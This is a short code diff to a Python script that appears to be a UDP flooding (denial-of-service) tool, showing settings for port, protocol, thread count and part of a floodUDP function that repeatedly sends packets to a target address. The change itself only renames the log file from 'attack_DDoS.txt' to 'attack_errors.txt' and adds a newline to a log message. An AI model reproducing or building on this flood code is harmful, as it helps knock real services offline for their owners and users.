@@ -15,7 +15,7 @@ port = 80
 choice = "UDP"
 times = 4
 threads = 4
-file_txt = open("attack_DDoS.txt", 'a')
+file_txt = open("attack_errors.txt", 'a')
 
 
 def floodUDP():
@@ -28,7 +28,7 @@ def floodUDP():
             for x in range(times):
                 s.sendto(data, address)
                 if j == True:
-                    file_txt.writelines("Sent packets.")
+                    file_txt.writelines("Sent packets.\n")
                     j = False
         except Exception as e:
             file_txt.writelines(e)
